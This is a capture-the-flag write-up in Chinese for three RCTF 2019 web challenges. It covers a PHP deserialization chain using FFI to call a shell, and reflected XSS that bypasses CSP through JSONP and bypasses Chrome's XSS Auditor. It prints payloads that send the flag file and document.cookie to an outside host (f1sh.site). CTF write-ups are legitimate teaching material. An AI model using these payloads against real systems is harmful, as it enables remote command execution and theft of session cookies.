    $a = new A;
    echo serialize($a);
最后反序列化执行：
    http://nextphp.2019.rctf.rois.io/?a=$a=unserialize('C%3a1%3a"A"%3a97%3a{a%3a3%3a{s%3a3%3a"ret"%3bN%3bs%3a4%3a"func"%3bs%3a9%3a"FFI%3a%3acdef"%3bs%3a3%3a"arg"%3bs%3a34%3a"int+php_exec(int+type,+char+*cmd)%3b"%3b}}');var_dump($a->ret->php_exec(2,'curl%20f1sh.site:2333/`cat%20/flag`'));
Flag:
    RCTF{Do_y0u_l1ke_php74?}
## rblog
进入题目后，先看着往年的 Writeup 膜一波蓝猫师傅。
查看网页源码，发现有一个 rblog.js ，点开看到里面有一个 api: `/api/v2/posts` 。
于是访问  ，发现是返回了三篇 Writeup
且是固定不变的，没看出有什么可以利用的点。
随手找下别的 api:  ，返回：
    {
        "status": false,
        "message": "'\/post' not found.",
        "data": []
    }
好像存在反射型 XSS ？尝试：
    https://rblog.2019.rctf.rois.io/api/v2/
没有解析，发现是因为 `Content-Type: application/json` 。
在这里卡了一会儿，后面在想这个会不会是什么框架，于是 google 了一发路由：
才明白原来这个 v 是版本的意思，于是尝试了一波 
同样测一波反射：
    https://rblog.2019.rctf.rois.io/api/v1/
这次解析了，因为此时 `Content-Type: text/html; charset=UTF-8` 。
XSS 有了，但是还有 CSP:
    Content-Security-Policy: default-src 'self'; object-src 'none'
题目给了 hint:
    API supports JSONP.
测试一下  ，返回：
    test({...})
于是很容易想到：
但是发现会被转义，变成：
无法闭合 script 标签，所以这条路走不通。
测试了一下标点符号，发现只有正反斜杠、单双引号会被转义，那么很容易想到我们可以利用 html 编码来绕过这些转义，payload:
在 Firefox 下已经可以执行任意 js 了，但是题目说明了 bot 使用的是 Chrome 74，当前的最新版本。在 Chrome 下这个
payload 会被 XSS Auditor 拦截，并且因为是最新版本的 Chrome ，暂不考虑是否存在什么 bypass auditor 的 0day
。
我们从 Auditor 的原理来考虑： Auditor 会检测 URL 中的含有的代码和页面中含有的代码是否一致，如果一致则会拦截。反之，从以往看到的很多
bypass 案例中，都可以知道如果后端对 URL 中的一些字符做了处理再返回，导致 URL 和页面中的内容不一致，就不会被拦截。
于是 Fuzz 后端会对哪些字符进行处理，测试到中文句号的时候发现：
后端会把中文句号 unicode 编码，于是我们就可以利用起这个操作，来混淆我们的 payload ，最终成功 bypass Chrome XSS
Auditor ：
    https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=(很多个中文句号
Report 给 bot ，成功在打回的 cookie 中获得 flag：
    RCTF{uwu_easy_bypass_with_escaped_unicode}
## ez4cr
这题是上一题的后续，从上一题打回来的 cookie 中可以得到提示：
    hint_for_rBlog_2019.2=the flag for rblog2019.2 is in the cookie of the report domain. You may need a chrome xss auditor bypass ._.
也就是这题需要在  域下找到一个 XSS 并且需要 Bypass
Chrome Xss Auditor 。
同样在页面源码中的 js 文件里发现一个 api: 
按照上一题的思路，测试 JSONP: 
    https://report-rblog.2019.rctf.rois.io/report.php?callback=test
尝试反射 XSS: [https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%3E](https://report-rblog.2019.rctf.rois.io/report.php?callback=)
没有任何过滤，并且 `Content-Type: text/html; charset=UTF-8` 。
那么很容易就可以得到一个 Bypass CSP 的 XSS:
    https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=https://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E
但是因为这一次后端没有对任何字符进行处理，所以无法再像上一题一样利用后端的处理来 Bypass Auditor ，感觉是一道硬核直接 Bypass
Auditor 的 0day 题目。。。
经过漫长的 Fuzz ，队友 @wisdomtree 发现这样可以 Bypass Auditor:
    https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E
仔细一看发现：
URL payload 中 script src 的协议 http 经过后端返回到页面中时直接变成了 https ，还贴心的给 src
加上了双引号，所以打破了一致性，绕过了 Auditor 。
于是 payload:
    https://report-rblog.2019.rctf.rois.io/report.php?callback=3Cscript%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=location.href=%27http://xss.f1sh.site/?%27%252bdocument.cookie;console.log%3E%3C/script%3E
Report 给 bot ，成功在打回的 cookie 中获得 flag：
    RCTF{charset_in_content-type_ignored._.??did_i_find_a_chrome_xss_filter_bypass_0day}
从 flag 感觉到我们的解法应该是非预期，于是问了一下蓝猫师傅，才知道这个协议的 upgrade 其实并不是后端处理的，而是因为题目使用了
Cloudflare CDN ，被 CDN 自动处理的，可以说是神助攻了。。。